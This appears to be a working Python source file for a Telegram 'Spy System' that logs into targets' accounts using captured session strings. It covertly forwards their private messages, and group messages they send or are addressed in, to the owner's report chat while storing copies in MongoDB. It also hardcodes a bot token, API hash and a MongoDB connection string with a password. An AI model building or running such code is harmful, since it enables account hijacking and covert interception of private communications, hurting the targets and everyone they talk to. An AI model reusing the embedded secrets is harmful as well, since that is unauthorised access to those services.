import os
import asyncio
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from pymongo import MongoClient
from flask import Flask
from threading import Thread
from datetime import datetime

# --- Configurations ---
API_ID = 38225985
API_HASH = "0b6330bc916f9e29d6bf302be079e9d6"
BOT_TOKEN = "8738081667:AAGr7HkSxO6nC_QhPJJElKR2VKABTEDfNEo"
OWNER_ID = 6015356597
REPORT_CHAT = -1003836655698

# MongoDB Setup
MONGO_URI = "mongodb+srv://khantphyoemin537_db_user:9VRKiaeZkz7rJdpz@cluster0.w6tgi8j.mongodb.net/?appName=Cluster0&tlsAllowInvalidCertificates=true"
db_client = MongoClient(MONGO_URI)
db = db_client["SpySystem_DB"]
sessions_db = db["active_strings"]
spy_logs = db["spy_logs"] # Delete Sync အတွက် ID တွေသိမ်းရန်

# Keep Alive Setup
app = Flask(__name__)
@app.route("/")
def home(): return "🦇 Spy System is Online"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

# Main Bot Client
bot = TelegramClient("report_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_clients = {}

# ==========================================
# 🛰 USERBOT SPY LOGIC (Filtered Reporting)
# ==========================================
async def run_spy_client(session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        uid = me.id
        
        @client.on(events.NewMessage)
        async def spy_handler(event):
            if event.chat_id == REPORT_CHAT: return
            
            should_report = False
            label = ""

            # 1. Private Chat (အဝင်ရော အထွက်ရော အကုန်ယူမယ်)
            if event.is_private:
                should_report = True
                label = "📩 Private DM"
            
            # 2. Group Chat (Target နဲ့ ပတ်သက်မှ ယူမယ်)
            elif event.is_group:
                # Target ကိုယ်တိုင် ပို့တာလား?
                if event.sender_id == uid:
                    should_report = True
                    label = "📤 Target Sent"
                # Target ကို Mention ခေါ်တာလား?
                elif event.mentioned:
                    should_report = True
                    label = "🔔 Mentioned Target"
                # Target ကို Reply ပြန်တာလား?
                elif event.is_reply:
                    reply_msg = await event.get_reply_message()
                    if reply_msg and reply_msg.sender_id == uid:
                        should_report = True
                        label = "💬 Replied to Target"

            if should_report:
                chat = await event.get_chat()
                chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Unknown'))
                sender = await event.get_sender()
                sender_name = getattr(sender, 'first_name', 'Unknown')

                report_text = (
                    f"🕵️ **Spy Alert [{label}]**\n"
                    f"👤 **Target:** {me.first_name}\n"
                    f"📍 **Where:** {chat_name} (`{event.chat_id}`)\n"
                    f"👤 **From:** {sender_name}\n"
                    f"💬 **Message:** {event.raw_text}"
                )
                
                # Report ပို့ပြီး Message ID ကို DB မှာ မှတ်ထားမယ် (ဖျက်ရင် လိုက်ဖျက်ဖို့)
                sent_msg = await bot.send_message(REPORT_CHAT, report_text)
                spy_logs.insert_one({
                    "report_msg_id": sent_msg.id,
                    "target_uid": uid,
                    "chat_id": event.chat_id,
                    "text": event.raw_text,
                    "time": datetime.utcnow()
                })

        active_clients[uid] = client
        await client.run_until_disconnected()
    except Exception as e:
        print(f"Error on session {session_str[:10]}: {e}")

# ==========================================
# 🗑 DELETE SYNC LOGIC
# ==========================================
@bot.on(events.MessageDeleted)
async def delete_handler(event):
    # Report Chat ထဲက စာဖျက်လိုက်တာကို စောင့်ကြည့်မယ်
    if event.chat_id == REPORT_CHAT:
        for msg_id in event.deleted_ids:
            # DB ထဲမှာ အဲ့ဒီ message id ရှိရင် လိုက်ဖျက်မယ်
            result = spy_logs.delete_one({"report_msg_id": msg_id})
            if result.deleted_count > 0:
                print(f"🗑 Log deleted from DB for msg_id: {msg_id}")

# ==========================================
# ⚙️ COMMANDS & RESTART
# ==========================================
@bot.on(events.NewMessage(pattern="/string"))
async def add_string(event):
    if event.sender_id != OWNER_ID: return
    if not event.is_reply:
        return await event.reply("❌ String စာသားကို Reply ထောက်ပြီး `/string` လို့ ရိုက်ပေးပါ သခင်လေး။")

    reply_msg = await event.get_reply_message()
    session_str = reply_msg.raw_text.strip()

    if not sessions_db.find_one({"session": session_str}):
        sessions_db.insert_one({"session": session_str})
        await event.reply("✅ String သိမ်းပြီးပါပြီ။ Smart Monitoring စတင်ပါပြီ...")
        asyncio.create_task(run_spy_client(session_str))
    else:
        await event.reply("⚠️ ဒီ String က ရှိပြီးသားကြီးပါ သခင်လေး။")

async def restart_all_spies():
    for data in sessions_db.find():
        asyncio.create_task(run_spy_client(data["session"]))

# ==========================================
# 🚀 START SYSTEM
# ==========================================
if __name__ == "__main__":
    Thread(target=run_flask).start()
    print("Bat Spy System is Online...")
    bot.loop.create_task(restart_all_spies())
    bot.run_until_disconnected()
